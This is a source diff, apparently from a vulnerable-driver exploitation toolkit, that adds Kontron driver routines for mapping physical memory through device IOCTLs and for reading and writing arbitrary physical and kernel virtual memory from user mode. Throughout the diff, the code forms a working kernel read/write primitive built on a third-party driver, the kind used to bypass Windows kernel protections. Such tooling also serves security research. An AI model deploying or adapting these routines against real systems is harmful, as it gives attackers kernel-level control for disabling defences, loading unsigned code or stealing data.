@@ -538,7 +538,7 @@ BOOL WINAPI CorMemVirtualToPhysical(
     _In_ ULONG_PTR VirtualAddress,
     _Out_ ULONG_PTR* PhysicalAddress)
 {
-    return PwVirtualToPhysicalEx(g_UseLA57, 
+    return PwVirtualToPhysicalEx(g_UseLA57,
         DeviceHandle,
         CorMemQueryRootTableValue,
         CorMemReadPhysicalMemory,
@@ -667,4 +667,238 @@ BOOL WINAPI CorMemReadKernelVirtualMemory(
     }
 
     return bResult;
+}
+
+//
+// These are specific for Kontron AG driver.
+//
+
+/*
+* KontronMapMemory
+*
+* Purpose:
+*
+* Maps the base physical page into the virtual address space via Kontron driver.
+*
+*/
+PVOID KontronMapMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ ULONG NumberOfBytes
+)
+{
+    ULONG_PTR pageBase, offset, mapSize;
+    KONTRON_MAP_MEMORY_REQUEST request;
+
+    RtlSecureZeroMemory(&request, sizeof(request));
+
+    supCalcPhysMapParams(PhysicalAddress,
+        NumberOfBytes,
+        &pageBase,
+        &offset,
+        &mapSize);
+
+    request.In.InterfaceType = 0;
+    request.In.BusNumber = 0;
+    request.In.AddressSpace = 0;
+    request.In.BusAddress.QuadPart = pageBase;
+    request.In.ViewSize = (ULONG)mapSize;
+
+    if (supCallDriver(
+        DeviceHandle,
+        KONTRON_IOCTL_MAP_MEMORY,
+        &request,
+        sizeof(KONTRON_MAP_MEMORY_REQUEST),
+        &request,
+        sizeof(KONTRON_MAP_MEMORY_REQUEST)))
+    {
+        return request.Out.VirtualAddress;
+    }
+
+    return NULL;
+}
+
+/*
+* KontronUnmapMemory
+*
+* Purpose:
+*
+* Unmaps previously mapped physical memory page using its exact base address via Kontron.
+*
+*/
+VOID KontronUnmapMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ PVOID SectionToUnmap
+)
+{
+    supCallDriver(
+        DeviceHandle,
+        KONTRON_IOCTL_UNMAP_MEMORY,
+        &SectionToUnmap,
+        sizeof(PVOID),
+        NULL,
+        0);
+}
+
+/*
+* KontronVirtualToPhysical
+*
+* Purpose:
+*
+* Translate virtual address to the physical.
+*
+*/
+BOOL WINAPI KontronVirtualToPhysical(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR VirtualAddress,
+    _Out_ ULONG_PTR* PhysicalAddress
+)
+{
+    UNREFERENCED_PARAMETER(DeviceHandle);
+
+    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
+}
+
+/*
+* KontronReadPhysicalMemory
+*
+* Purpose:
+*
+* Read from physical memory using Kontron driver.
+*
+*/
+BOOL WINAPI KontronReadPhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes
+)
+{
+    BOOL bResult = FALSE;
+    DWORD dwError = ERROR_SUCCESS;
+    PVOID mappedVA = NULL;
+    ULONG_PTR pageBase, offset;
+    ULONG_PTR mapSize;
+
+    supCalcPhysMapParams(PhysicalAddress,
+        NumberOfBytes,
+        &pageBase,
+        &offset,
+        &mapSize);
+
+    mappedVA = KontronMapMemory(DeviceHandle, pageBase, (ULONG)mapSize);
+    if (mappedVA) {
+
+        __try {
+
+            RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedVA, offset), NumberOfBytes);
+            bResult = TRUE;
+
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            bResult = FALSE;
+            dwError = GetExceptionCode();
+        }
+
+        KontronUnmapMemory(DeviceHandle, mappedVA);
+    }
+    else {
+        dwError = GetLastError();
+    }
+    SetLastError(dwError);
+    return bResult;
+}
+
+/*
+* KontronWritePhysicalMemory
+*
+* Purpose:
+*
+* Write to physical memory using Kontron driver.
+*
+*/
+BOOL WINAPI KontronWritePhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes
+)
+{
+    BOOL bResult = FALSE;
+    DWORD dwError = ERROR_SUCCESS;
+    PVOID mappedVA = NULL;
+    ULONG_PTR pageBase, offset;
+    ULONG_PTR mapSize;
+
+    supCalcPhysMapParams(PhysicalAddress,
+        NumberOfBytes,
+        &pageBase,
+        &offset,
+        &mapSize);
+
+    mappedVA = KontronMapMemory(DeviceHandle, pageBase, (ULONG)mapSize);
+    if (mappedVA) {
+
+        __try {
+
+            RtlCopyMemory(RtlOffsetToPointer(mappedVA, offset), Buffer, NumberOfBytes);
+            bResult = TRUE;
+
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            bResult = FALSE;
+            dwError = GetExceptionCode();
+        }
+
+        KontronUnmapMemory(DeviceHandle, mappedVA);
+    }
+    else {
+        dwError = GetLastError();
+    }
+    SetLastError(dwError);
+    return bResult;
+}
+
+/*
+* KontronWriteKernelVirtualMemory
+*
+* Purpose:
+*
+* Write virtual memory.
+*
+*/
+BOOL WINAPI KontronWriteKernelVirtualMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR Address,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes
+)
+{
+    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
+        Address,
+        Buffer,
+        NumberOfBytes,
+        KontronWritePhysicalMemory);
+}
+
+/*
+* KontronReadKernelVirtualMemory
+*
+* Purpose:
+*
+* Read virtual memory.
+*
+*/
+BOOL WINAPI KontronReadKernelVirtualMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR Address,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes
+)
+{
+    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
+        Address,
+        Buffer,
+        NumberOfBytes,
+        KontronReadPhysicalMemory);
 }
